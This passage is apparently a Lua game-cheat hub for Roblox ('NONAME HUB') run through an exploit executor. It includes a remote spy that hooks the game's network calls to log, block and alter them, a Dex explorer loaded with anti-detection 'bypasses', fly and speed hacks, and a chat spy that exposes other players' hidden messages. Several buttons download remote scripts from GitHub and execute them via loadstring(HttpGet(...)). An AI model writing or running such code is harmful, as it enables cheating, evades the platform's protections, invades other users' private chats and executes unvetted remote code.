    
    --- the big (well tbh small now) boi task scheduler himself, handles p much anything as quicc as possible
    function taskscheduler()
        if not toggle then
            scheduled = {}
            return
        end
        if #scheduled > 1000 then
            table.remove(scheduled, #scheduled)
        end
        if #scheduled > 0 then
            local currentf = scheduled[1]
            table.remove(scheduled, 1)
            if type(currentf) == "table" and type(currentf[1]) == "function" then
                pcall(unpack(currentf))
            end
        end
    end
    
    --- Handles remote logs
    function remoteHandler(hookfunction, methodName, remote, args, funcInfo, calling, returnValue)
        local validInstance, validClass = pcall(function()
            return remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")
        end)
        if validInstance and validClass then
            local func = funcInfo.func
            if not calling then
                _, calling = pcall(getScriptFromSrc, funcInfo.source)
            end
            coroutine.wrap(function()
                if remoteSignals[remote] then
                    remoteSignals[remote]:Fire(args)
                end
            end)()
            if autoblock then
                if excluding[remote] then
                    return
                end
                if not history[remote] then
                    history[remote] = { badOccurances = 0, lastCall = tick() }
                end
                if tick() - history[remote].lastCall < 1 then
                    history[remote].badOccurances += 1
                    return
                else
                    history[remote].badOccurances = 0
                end
                if history[remote].badOccurances > 3 then
                    excluding[remote] = true
                    return
                end
                history[remote].lastCall = tick()
            end
            local functionInfoStr
            local src
            if func and islclosure(func) then
                local functionInfo = {}
                functionInfo.info = funcInfo
                pcall(function()
                    functionInfo.constants = debug.getconstants(func)
                end)
                pcall(function()
                    functionInfoStr = v2v({ functionInfo = functionInfo })
                end)
                pcall(function()
                    if type(calling) == "userdata" then
                        src = calling
                    end
                end)
            end
            if methodName:lower() == "fireserver" then
                newRemote(
                    "event",
                    remote.Name,
                    args,
                    remote,
                    functionInfoStr,
                    (blocklist[remote] or blocklist[remote.Name]),
                    src
                )
            elseif methodName:lower() == "invokeserver" then
                newRemote(
                    "function",
                    remote.Name,
                    args,
                    remote,
                    functionInfoStr,
                    (blocklist[remote] or blocklist[remote.Name]),
                    src,
                    returnValue
                )
            end
        end
    end
    
    --- Used for hookfunction
    function hookRemote(remoteType, remote, ...)
        if typeof(remote) == "Instance" then
            local args = { ... }
            local validInstance, remoteName = pcall(function()
                return remote.Name
            end)
            if validInstance and not (blacklist[remote] or blacklist[remoteName]) then
                local funcInfo = {}
                local calling
                if funcEnabled then
                    funcInfo = debug.getinfo(4) or funcInfo
                    calling = useGetCallingScript and getcallingscript() or nil
                end
                if recordReturnValues and remoteType == "RemoteFunction" then
                    local thread = coroutine.running()
                    local args = { ... }
                    task.defer(function()
                        local returnValue
                        if remoteHooks[remote] then
                            args = { remoteHooks[remote](unpack(args)) }
                            returnValue = originalFunction(remote, unpack(args))
                        else
                            returnValue = originalFunction(remote, unpack(args))
                        end
                        schedule(
                            remoteHandler,
                            true,
                            remoteType == "RemoteEvent" and "fireserver" or "invokeserver",
                            remote,
                            args,
                            funcInfo,
                            calling,
                            returnValue
                        )
                        if blocklist[remote] or blocklist[remoteName] then
                            coroutine.resume(thread)
                        else
                            coroutine.resume(thread, unpack(returnValue))
                        end
                    end)
                else
                    schedule(
                        remoteHandler,
                        true,
                        remoteType == "RemoteEvent" and "fireserver" or "invokeserver",
                        remote,
                        args,
                        funcInfo,
                        calling
                    )
                    if blocklist[remote] or blocklist[remoteName] then
                        return
                    end
                end
            end
        end
        if recordReturnValues and remoteType == "RemoteFunction" then
            return coroutine.yield()
        elseif remoteType == "RemoteEvent" then
            if remoteHooks[remote] then
                return originalEvent(remote, remoteHooks[remote](...))
            end
            return originalEvent(remote, ...)
        else
            if remoteHooks[remote] then
                return originalFunction(remote, remoteHooks[remote](...))
            end
            return originalFunction(remote, ...)
        end
    end
    
    local newnamecall = newcclosure(function(remote, ...)
        if typeof(remote) == "Instance" then
            local args = { ... }
            local methodName = getnamecallmethod()
            local validInstance, remoteName = pcall(function()
                return remote.Name
            end)
            if
                validInstance
                and (methodName == "FireServer" or methodName == "fireServer" or methodName == "InvokeServer" or methodName == "invokeServer")
                and not (blacklist[remote] or blacklist[remoteName])
            then
                local funcInfo = {}
                local calling
                if funcEnabled then
                    funcInfo = debug.getinfo(3) or funcInfo
                    calling = useGetCallingScript and getcallingscript() or nil
                end
                if recordReturnValues and (methodName == "InvokeServer" or methodName == "invokeServer") then
                    local namecallThread = coroutine.running()
                    local args = { ... }
                    task.defer(function()
                        local returnValue
                        setnamecallmethod(methodName)
                        if remoteHooks[remote] then
                            args = { remoteHooks[remote](unpack(args)) }
                            returnValue = { original(remote, unpack(args)) }
                        else
                            returnValue = { original(remote, unpack(args)) }
                        end
                        coroutine.resume(namecallThread, unpack(returnValue))
                        coroutine.wrap(function()
                            schedule(remoteHandler, false, methodName, remote, args, funcInfo, calling, returnValue)
                        end)()
                    end)
                else
                    coroutine.wrap(function()
                        schedule(remoteHandler, false, methodName, remote, args, funcInfo, calling)
                    end)()
                end
            end
            if recordReturnValues and (methodName == "InvokeServer" or methodName == "invokeServer") then
                return coroutine.yield()
            elseif
                validInstance
                and (methodName == "FireServer" or methodName == "fireServer" or methodName == "InvokeServer" or methodName == "invokeServer")
                and (blocklist[remote] or blocklist[remoteName])
            then
                return nil
            elseif
                (not recordReturnValues or methodName ~= "InvokeServer" or methodName ~= "invokeServer")
                and validInstance
                and (methodName == "FireServer" or methodName == "fireServer" or methodName == "InvokeServer" or methodName == "invokeServer")
                and remoteHooks[remote]
            then
                return original(remote, remoteHooks[remote](...))
            else
                return original(remote, ...)
            end
        end
        return original(remote, ...)
    end, original)
    
    local newFireServer = newcclosure(function(...)
        return hookRemote("RemoteEvent", ...)
    end, originalEvent)
    
    local newInvokeServer = newcclosure(function(...)
        return hookRemote("RemoteFunction", ...)
    end, originalFunction)
    
    --- Toggles on and off the remote spy
    function toggleSpy()
        if not toggle then
            if hookmetamethod then
                local oldNamecall = hookmetamethod(game, "__namecall", newnamecall)
                original = original or function(...)
                    return oldNamecall(...)
                end
                _G.OriginalNamecall = original
            else
                gm = gm or getrawmetatable(game)
                original = original or function(...)
                    return gm.__namecall(...)
                end
                setreadonly(gm, false)
                if not original then
                    warn("SimpleSpy: namecall method not found!")
                    onToggleButtonClick()
                    return
                end
                gm.__namecall = newnamecall
                setreadonly(gm, true)
            end
            originalEvent = hookfunction(remoteEvent.FireServer, newFireServer)
            originalFunction = hookfunction(remoteFunction.InvokeServer, newInvokeServer)
        else
            if hookmetamethod then
                if original then
                    hookmetamethod(game, "__namecall", original)
                end
            else
                gm = gm or getrawmetatable(game)
                setreadonly(gm, false)
                gm.__namecall = original
                setreadonly(gm, true)
            end
            hookfunction(remoteEvent.FireServer, originalEvent)
            hookfunction(remoteFunction.InvokeServer, originalFunction)
        end
    end
    
    --- Toggles between the two remotespy methods (hookfunction currently = disabled)
    function toggleSpyMethod()
        toggleSpy()
        toggle = not toggle
    end
    
    --- Shuts down the remote spy
    function shutdown()
        if schedulerconnect then
            schedulerconnect:Disconnect()
        end
        for _, connection in pairs(connections) do
            coroutine.wrap(function()
                connection:Disconnect()
            end)()
        end
        SimpleSpy2:Destroy()
        hookfunction(remoteEvent.FireServer, originalEvent)
        hookfunction(remoteFunction.InvokeServer, originalFunction)
        if hookmetamethod then
            if original then
                hookmetamethod(game, "__namecall", original)
            end
        else
            gm = gm or getrawmetatable(game)
            setreadonly(gm, false)
            gm.__namecall = original
            setreadonly(gm, true)
        end
        _G.SimpleSpyExecuted = false
    end
    
    -- main
    if not _G.SimpleSpyExecuted then
        local succeeded, err = pcall(function()
            if not RunService:IsClient() then
                error("SimpleSpy cannot run on the server!")
            end
            if
                not hookfunction
                or not getrawmetatable
                or getrawmetatable and not getrawmetatable(game).__namecall
                or not setreadonly
            then
                local missing = {}
                if not hookfunction then
                    table.insert(missing, "hookfunction")
                end
                if not getrawmetatable then
                    table.insert(missing, "getrawmetatable")
                end
                if getrawmetatable and not getrawmetatable(game).__namecall then
                    table.insert(missing, "getrawmetatable(game).__namecall")
                end
                if not setreadonly then
                    table.insert(missing, "setreadonly")
                end
                shutdown()
                error(
                    "This environment does not support method hooks!\n(Your exploit is not capable of running SimpleSpy)\nMissing: "
                        .. table.concat(missing, ", ")
                )
            end
            _G.SimpleSpyShutdown = shutdown
            ContentProvider:PreloadAsync({
                "rbxassetid://6065821980",
                "rbxassetid://6065774948",
                "rbxassetid://6065821086",
                "rbxassetid://6065821596",
                ImageLabel,
                ImageLabel_2,
                ImageLabel_3,
            })
            -- if gethui then funcEnabled = false end
            onToggleButtonClick()
            RemoteTemplate.Parent = nil
            FunctionTemplate.Parent = nil
            codebox = Highlight.new(CodeBox)
            codebox:setRaw("")
            getgenv().SimpleSpy = SimpleSpy
            getgenv().getNil = function(name, class)
                for _, v in pairs(getnilinstances()) do
                    if v.ClassName == class and v.Name == name then
                        return v
                    end
                end
            end
            TextLabel:GetPropertyChangedSignal("Text"):Connect(scaleToolTip)
            -- TopBar.InputBegan:Connect(onBarInput)
            MinimizeButton.MouseButton1Click:Connect(toggleMinimize)
            MaximizeButton.MouseButton1Click:Connect(toggleSideTray)
            Simple.MouseButton1Click:Connect(onToggleButtonClick)
            CloseButton.MouseEnter:Connect(onXButtonHover)
            CloseButton.MouseLeave:Connect(onXButtonUnhover)
            Simple.MouseEnter:Connect(onToggleButtonHover)
            Simple.MouseLeave:Connect(onToggleButtonUnhover)
            CloseButton.MouseButton1Click:Connect(shutdown)
            table.insert(connections, UserInputService.InputBegan:Connect(backgroundUserInput))
            connectResize()
            SimpleSpy2.Enabled = true
            coroutine.wrap(function()
                wait(1)
                onToggleButtonUnhover()
            end)()
            schedulerconnect = RunService.Heartbeat:Connect(taskscheduler)
            if syn and syn.protect_gui then
                pcall(syn.protect_gui, SimpleSpy2)
            end
            bringBackOnResize()
            SimpleSpy2.Parent = --[[gethui and gethui() or]]
                CoreGui
            _G.SimpleSpyExecuted = true
            if not Players.LocalPlayer then
                Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
            end
            Mouse = Players.LocalPlayer:GetMouse()
            oldIcon = Mouse.Icon
            table.insert(connections, Mouse.Move:Connect(mouseMoved))
        end)
        if not succeeded then
            warn(
                "A fatal error has occured, SimpleSpy was unable to launch properly.\nPlease DM this error message to @exx#9394:\n\n"
                    .. tostring(err)
            )
            SimpleSpy2:Destroy()
            hookfunction(remoteEvent.FireServer, originalEvent)
            hookfunction(remoteFunction.InvokeServer, originalFunction)
            if hookmetamethod then
                if original then
                    hookmetamethod(game, "__namecall", original)
                end
            else
                setreadonly(gm, false)
                gm.__namecall = original
                setreadonly(gm, true)
            end
            return
        end
    else
        SimpleSpy2:Destroy()
        return
    end
    
    newButton("Copy Code", function()
        return "Click to copy code"
    end, function()
        setclipboard(codebox:getString())
        TextLabel.Text = "Copied successfully!"
    end)
    
    --- Copies the source script (that fired the remote)
    newButton("Copy Remote", function()
        return "Click to copy the path of the remote"
    end, function()
        if selected then
            setclipboard(v2s(selected.Remote.remote))
            TextLabel.Text = "Copied!"
        end
    end)
    
    -- Executes the contents of the codebox through loadstring
    newButton("Run Code", function()
        return "Click to execute code"
    end, function()
        local orText = "Click to execute code"
        TextLabel.Text = "Executing..."
        local succeeded = pcall(function()
            return loadstring(codebox:getString())()
        end)
        if succeeded then
            TextLabel.Text = "Executed successfully!"
        else
            TextLabel.Text = "Execution error!"
        end
    end)
    
    --- Gets the calling script (not super reliable but w/e)
    newButton("Get Script", function()
        return "Click to copy calling script to clipboard\nWARNING: Not super reliable, nil == could not find"
    end, function()
        if selected then
            setclipboard(SimpleSpy:ValueToString(selected.Source))
            TextLabel.Text = "Done!"
        end
    end)
    
    --- Decompiles the script that fired the remote and puts it in the code box
    newButton("Function Info", function()
        return "Click to view calling function information"
    end, function()
        if selected then
            if selected.Function then
                codebox:setRaw(
                    "-- Calling function info\n-- Generated by the SimpleSpy serializer\n\n" .. tostring(selected.Function)
                )
            end
            TextLabel.Text = "Done! Function info generated by the SimpleSpy Serializer."
        end
    end)
    
    --- Clears the Remote logs
    newButton("Clr Logs", function()
        return "Click to clear logs"
    end, function()
        TextLabel.Text = "Clearing..."
        logs = {}
        for _, v in pairs(LogList:GetChildren()) do
            if not v:IsA("UIListLayout") then
                v:Destroy()
            end
        end
        codebox:setRaw("")
        selected = nil
        TextLabel.Text = "Logs cleared!"
    end)
    
    --- Excludes the selected.Log Remote from the RemoteSpy
    newButton("Exclude (i)", function()
        return "Click to exclude this Remote.\nExcluding a remote makes SimpleSpy ignore it, but it will continue to be usable."
    end, function()
        if selected then
            blacklist[selected.Remote.remote] = true
            TextLabel.Text = "Excluded!"
        end
    end)
    
    --- Excludes all Remotes that share the same name as the selected.Log remote from the RemoteSpy
    newButton("Exclude (n)", function()
        return "Click to exclude all remotes with this name.\nExcluding a remote makes SimpleSpy ignore it, but it will continue to be usable."
    end, function()
        if selected then
            blacklist[selected.Name] = true
            TextLabel.Text = "Excluded!"
        end
    end)
    
    --- clears blacklist
    newButton("Clr Blacklist", function()
        return "Click to clear the blacklist.\nExcluding a remote makes SimpleSpy ignore it, but it will continue to be usable."
    end, function()
        blacklist = {}
        TextLabel.Text = "Blacklist cleared!"
    end)
    
    --- Prevents the selected.Log Remote from firing the server (still logged)
    newButton("Block (i)", function()
        return "Click to stop this remote from firing.\nBlocking a remote won't remove it from SimpleSpy logs, but it will not continue to fire the server."
    end, function()
        if selected then
            if selected.Remote.remote then
                blocklist[selected.Remote.remote] = true
                TextLabel.Text = "Excluded!"
            else
                TextLabel.Text = "Error! Instance may no longer exist, try using Block (n)."
            end
        end
    end)
    
    --- Prevents all remotes from firing that share the same name as the selected.Log remote from the RemoteSpy (still logged)
    newButton("Block (n)", function()
        return "Click to stop remotes with this name from firing.\nBlocking a remote won't remove it from SimpleSpy logs, but it will not continue to fire the server."
    end, function()
        if selected then
            blocklist[selected.Name] = true
            TextLabel.Text = "Excluded!"
        end
    end)
    
    --- clears blacklist
    newButton("Clr Blocklist", function()
        return "Click to stop blocking remotes.\nBlocking a remote won't remove it from SimpleSpy logs, but it will not continue to fire the server."
    end, function()
        blocklist = {}
        TextLabel.Text = "Blocklist cleared!"
    end)
    
    --- Attempts to decompile the source script
    newButton("Decompile", function()
        return "Attempts to decompile source script\nWARNING: Not super reliable, nil == could not find"
    end, function()
        if selected then
            if selected.Source then
                codebox:setRaw(decompile(selected.Source))
                TextLabel.Text = "Done!"
            else
                TextLabel.Text = "Source not found!"
            end
        end
    end)
    
    newButton("Disable Info", function()
        return string.format(
            "[%s] Toggle function info (because it can cause lag in some games)",
            funcEnabled and "ENABLED" or "DISABLED"
        )
    end, function()
        funcEnabled = not funcEnabled
        TextLabel.Text = string.format(
            "[%s] Toggle function info (because it can cause lag in some games)",
            funcEnabled and "ENABLED" or "DISABLED"
        )
    end)
    
    newButton("Autoblock", function()
        return string.format(
            "[%s] [BETA] Intelligently detects and excludes spammy remote calls from logs",
            autoblock and "ENABLED" or "DISABLED"
        )
    end, function()
        autoblock = not autoblock
        TextLabel.Text = string.format(
            "[%s] [BETA] Intelligently detects and excludes spammy remote calls from logs",
            autoblock and "ENABLED" or "DISABLED"
        )
        history = {}
        excluding = {}
    end)
    
    newButton("CallingScript", function()
        return string.format(
            "[%s] [UNSAFE] Uses 'getcallingscript' to get calling script for Decompile and GetScript. Much more reliable, but opens up SimpleSpy to detection and/or instability.",
            useGetCallingScript and "ENABLED" or "DISABLED"
        )
    end, function()
        useGetCallingScript = not useGetCallingScript
        TextLabel.Text = string.format(
            "[%s] [UNSAFE] Uses 'getcallingscript' to get calling script for Decompile and GetScript. Much more reliable, but opens up SimpleSpy to detection and/or instability.",
            useGetCallingScript and "ENABLED" or "DISABLED"
        )
    end)
    
    newButton("KeyToString", function()
        return string.format(
            "[%s] [BETA] Uses an experimental new function to replicate Roblox's behavior when a non-primitive type is used as a key in a table. Still in development and may not properly reflect tostringed (empty) userdata.",
            keyToString and "ENABLED" or "DISABLED"
        )
    end, function()
        keyToString = not keyToString
        TextLabel.Text = string.format(
            "[%s] [BETA] Uses an experimental new function to replicate Roblox's behavior when a non-primitive type is used as a key in a table. Still in development and may not properly reflect tostringed (empty) userdata.",
            keyToString and "ENABLED" or "DISABLED"
        )
    end)
    
    newButton("ToggleReturnValues", function()
        return string.format(
            "[%s] [EXPERIMENTAL] Enables recording of return values for 'GetReturnValue'\n\nUse this method at your own risk, as it could be detectable.",
            recordReturnValues and "ENABLED" or "DISABLED"
        )
    end, function()
        recordReturnValues = not recordReturnValues
        TextLabel.Text = string.format(
            "[%s] [EXPERIMENTAL] Enables recording of return values for 'GetReturnValue'\n\nUse this method at your own risk, as it could be detectable.",
            recordReturnValues and "ENABLED" or "DISABLED"
        )
    end)
    
    newButton("GetReturnValue", function()
        return "[Experimental] If 'ReturnValues' is enabled, this will show the recorded return value for the RemoteFunction (if available)."
    end, function()
        if selected then
            codebox:setRaw(SimpleSpy:ValueToVar(selected.ReturnValue, "returnValue"))
        end
    end)
end)

------------------------------------------------------------------------------------------

local Section = Tab:NewSection("Dark Dev")
Section:NewButton("Click", " ", function() 
-- Cloneref support (adds support for JJsploit/Temple/Electron and other sploits that don't have cloneref or really shit versions of it.)
loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Dark-Dev-V3/main/CloneRef.lua", true))()

-- Dex Bypasses
loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Dark-Dev-V3/main/Bypasses.lua", true))()

-- Dex with CloneRef Support (made as global)
getgenv().Bypassed_Dex = game:GetObjects("rbxassetid://9352453730")[1]

local charset = {}
for i = 48,  57 do table.insert(charset, string.char(i)) end
for i = 65,  90 do table.insert(charset, string.char(i)) end
for i = 97, 122 do table.insert(charset, string.char(i)) end
function RandomCharacters(length)
    if length > 0 then
        return RandomCharacters(length - 1) .. charset[math.random(1, #charset)]
    else
        return ""
    end
end

Bypassed_Dex.Name = RandomCharacters(math.random(5, 20))
if gethui then
    Bypassed_Dex.Parent = gethui();
elseif syn and syn.protect_gui then
    syn.protect_gui(Bypassed_Dex);
    Bypassed_Dex.Parent = cloneref(game:GetService("CoreGui"))
else
    Bypassed_Dex.Parent = cloneref(game:GetService("CoreGui"))
end

local function Load(Obj, Url)
    local function GiveOwnGlobals(Func, Script)
        local Fenv = {}
        local RealFenv = {script = Script}
        local FenvMt = {}
        function FenvMt:__index(b)
            if RealFenv[b] == nil then
                return getfenv()[b]
            else
                return RealFenv[b]
            end
        end
        function FenvMt:__newindex(b, c)
            if RealFenv[b] == nil then
                getfenv()[b] = c
            else
                RealFenv[b] = c
            end
        end
        setmetatable(Fenv, FenvMt)
        setfenv(Func, Fenv)
        return Func
    end
    
    local function LoadScripts(Script)
        if Script.ClassName == "Script" or Script.ClassName == "LocalScript" then
            task.spawn(GiveOwnGlobals(loadstring(Script.Source, "=" .. Script:GetFullName()), Script))
        end
        for _,v in ipairs(Script:GetChildren()) do
            LoadScripts(v)
        end
    end
    
    LoadScripts(Obj)
end

Load(Bypassed_Dex)
end)


local Section = Tab:NewSection("Copy CFrame")
Section:NewButton("Copy", " ", function()
    local CF = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    setclipboard(tostring(CF))

    local args = {
        [1] = "Success",
        [2] = "NONAME HUB",
        [3] = "Copy CFrame Success"
    }  
    game:GetService("ReplicatedStorage").pNotifyStorage.pNotifyEvent:FireServer(unpack(args))
end)


----------------------------------------------------------------------------------------------------------

local Section = Tab:NewSection("Vehicle Fly")
Section:NewButton("Fly / Car fly (Z)", "vehicle fly | Stop Z", function(CARFLY) 
flying = (CARFLY)
repeat wait()
    until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
local mouse = game.Players.LocalPlayer:GetMouse()
repeat wait() until mouse
local plr = game.Players.LocalPlayer
local torso = plr.Character.Torso
local flying = true
local deb = true
local ctrl = {f = 0, b = 0, l = 0, r = 0}
local lastctrl = {f = 0, b = 0, l = 0, r = 0}
local maxspeed = 500
local speed = 0
 
function Fly()
local bg = Instance.new("BodyGyro", torso)
bg.P = 9e4
bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
bg.cframe = torso.CFrame
local bv = Instance.new("BodyVelocity", torso)
bv.velocity = Vector3.new(0,0.1,0)
bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
repeat wait()
plr.Character.Humanoid.PlatformStand = false
if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
speed = speed+125.0+(speed/maxspeed)
if speed > maxspeed then
speed = maxspeed
end
elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
speed = speed-250
if speed < 0 then
speed = 0
end
end
if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
else
bv.velocity = Vector3.new(0,0.1,0)
end
bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
until not flying
ctrl = {f = 0, b = 0, l = 0, r = 0}
lastctrl = {f = 0, b = 0, l = 0, r = 0}
speed = 0
bg:Destroy()
bv:Destroy()
plr.Character.Humanoid.PlatformStand = false
end
mouse.KeyDown:connect(function(key)
if key:lower() == "z" then
if flying then flying = false
else
flying = true
Fly()
end
elseif key:lower() == "w" then
ctrl.f = 1
elseif key:lower() == "s" then
ctrl.b = -1
elseif key:lower() == "a" then
ctrl.l = -1
elseif key:lower() == "d" then
ctrl.r = 1
end
end)
mouse.KeyUp:connect(function(key)
if key:lower() == "w" then
ctrl.f = 0
elseif key:lower() == "s" then
ctrl.b = 0
elseif key:lower() == "a" then
ctrl.l = 0
elseif key:lower() == "d" then
ctrl.r = 0
end
wait(5)
hint:Destroy()
end)
Fly()
end)

------------------------------------------------------------------------------------------

local Section = Tab:NewSection("Chat SPY")
Section:NewButton("Click", "chat /spy to toggle!", function() 

enabled = true --chat "/spy" to toggle!
spyOnMyself = true --if true will check your messages too
public = false --if true will chat the logs publicly (fun, risky)
publicItalics = true --if true will use /me to stand out
privateProperties = { --customize private logs
	Color = Color3.fromRGB(0,255,255); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}


local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance

local function onChatted(p,msg)
	if _G.chatSpyInstance == instance then
		if p==player and msg:lower():sub(1,4)=="/spy" then
			enabled = not enabled
			wait(0.3)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
		elseif enabled and (spyOnMyself==true or p~=player) then
			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
			local hidden = true
			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
					hidden = false
				end
			end)
			wait(1)
			conn:Disconnect()
			if hidden and enabled then
				if public then
					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
				else
					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
				end
			end
		end
	end
end

for _,p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
end)

------------------------------------------------------------------------------------------

local Section = Tab:NewSection("Server Hop")

Section:NewButton("Click", " ", function() 
    Time = 0.5 -- seconds
    repeat wait() until game:IsLoaded()
    wait(Time)
    local PlaceID = game.PlaceId
    local AllIDs = {}
    local foundAnything = ""
    local actualHour = os.date("!*t").hour
    local Deleted = false
    function TPReturner()
       local Site;
       if foundAnything == "" then
           Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
       else
           Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
       end
       local ID = ""
       if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
           foundAnything = Site.nextPageCursor
       end
       local num = 0;
       for i,v in pairs(Site.data) do
           local Possible = true
           ID = tostring(v.id)
           if tonumber(v.maxPlayers) > tonumber(v.playing) then
               for _,Existing in pairs(AllIDs) do
                   if num ~= 0 then
                       if ID == tostring(Existing) then
                           Possible = false
                       end
                   else
                       if tonumber(actualHour) ~= tonumber(Existing) then
                           local delFile = pcall(function()
                               delfile("NotSameServers.json")
                               AllIDs = {}
                               table.insert(AllIDs, actualHour)
                           end)
                       end
                   end
                   num = num + 1
               end
               if Possible == true then
                   table.insert(AllIDs, ID)
                   wait()
                   pcall(function()
                       writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
                       wait()
                       game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                   end)
                   wait(4)
               end
           end
       end
    end
    
    function Teleport()
       while wait() do
           pcall(function()
               TPReturner()
               if foundAnything ~= "" then
                   TPReturner()
               end
           end)
       end
    end
    
    -- If you'd like to use a script before server hopping (Like a Automatic Chest collector you can put the Teleport() after it collected everything.
    Teleport()
end)

------------------------------------------------------------------------------------------

local Section = Tab:NewSection("Rejoin")

Section:NewButton("Click", "ออกเข้าใหม่", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/blox-fruit-fake-level-/main/Rejoin%20Game.lua"))() end)

------------------------------------------------------------------------------------------

local Tab = Window:NewTab("Game")

local Section = Tab:NewSection("Vehicle Fly")
Section:NewButton("Speed Car", "vehicle Speed | Stop Z", function() 
-- init
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/GreenDeno/Venyx-UI-Library/main/source.lua"))()
local Venyx = library.new("Vehicle Speed Changer Script | NONAME HUB 4.0 | By:peatchXD#6075", 5013109572)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- themes
local themes = {
	Background = Color3.fromRGB(24, 24, 24),
	Glow = Color3.fromRGB(0, 0, 0),
	Accent = Color3.fromRGB(10, 10, 10),
	LightContrast = Color3.fromRGB(20, 20, 20),
	DarkContrast = Color3.fromRGB(14, 14, 14),  
	TextColor = Color3.fromRGB(255, 255, 255)
}

-- first page
local Page = Venyx:addPage("Vehicle", 8356815386)
local UI = Page:addSection("UI")
local usageSection = Page:addSection("Usage")
local flightSection = Page:addSection("Flight")
local flightEnabled = false
local flightSpeed = 1
local velocityEnabled = false;

local function GetVehicleFromDescendant(Descendant)
	return
		Descendant:FindFirstAncestor(LocalPlayer.Name .. "\'s Car") or
		(Descendant:FindFirstAncestor("Body") and Descendant:FindFirstAncestor("Body").Parent) or
		(Descendant:FindFirstAncestor("Misc") and Descendant:FindFirstAncestor("Misc").Parent) or
		Descendant:FindFirstAncestorWhichIsA("Model")
end

local function TeleportVehicle(CoordinateFrame: CFrame)
	local Parent = LocalPlayer.Character.Parent
	local Vehicle = GetVehicleFromDescendant(LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").SeatPart)
	LocalPlayer.Character.Parent = Vehicle
	local success, response = pcall(function()
		return Vehicle:SetPrimaryPartCFrame(CoordinateFrame)
	end)
	if not success then
		return Vehicle:MoveTo(CoordinateFrame.Position)
	end
end

UI:addKeybind("Toggle Keybind", Enum.KeyCode.F, function()
	print("Activated Keybind")
	Venyx:toggle()
end, function()
	print("Changed Keybind")
end)

usageSection:addToggle("Keybinds Active", velocityEnabled, function(v) velocityEnabled = v end)
flightSection:addToggle("Enabled", false, function(v) flightEnabled = v end)
flightSection:addSlider("Speed", 100, 0, 800, function(v) flightSpeed = v / 100 end)
local defaultCharacterParent 
RunService.Stepped:Connect(function()
